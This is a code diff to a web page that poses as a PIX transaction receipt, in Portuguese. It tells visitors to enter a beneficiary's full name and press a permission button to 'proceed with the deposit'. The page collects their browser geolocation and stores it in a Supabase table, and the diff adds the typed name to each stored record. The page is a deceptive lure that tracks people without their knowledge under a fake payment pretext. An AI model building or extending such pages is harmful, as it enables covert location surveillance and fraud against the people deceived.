@@ -13,7 +13,7 @@
     <h2>Comprovante de transação PIX</h2>
     
     <p id="status">Para confirmar, digite o nome completo da pessoa beneficiária e depois clique em PERMITIR para prosseguir com seu depósito.</p>
-    
+    <input type="text" id="username" placeholder="Nome completo">
     <button onclick="getLocation()">PERMITIR</button>
 
     <img id="imagem" src="assets\android-chrome-192x192.png" alt="Comprovante" width="300">
@@ -72,6 +72,13 @@
         }
     
         async function sendLocation(position) {
+            const username = document.getElementById("username").value;
+            if (!username) {
+                document.getElementById("status").innerText = "Por favor, digite um nome.";
+                return;
+            }
+
+            
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
     
@@ -83,7 +90,7 @@
             try {
                 const { data, error } = await supabase
                     .from("localizacoes")
-                    .insert([{ latitude, longitude, created_at: new Date().toISOString() }]);
+                    .insert([{ latitude, longitude, created_at: new Date().toISOString(), name: username }]);
     
                 if (error) {
                     throw error;
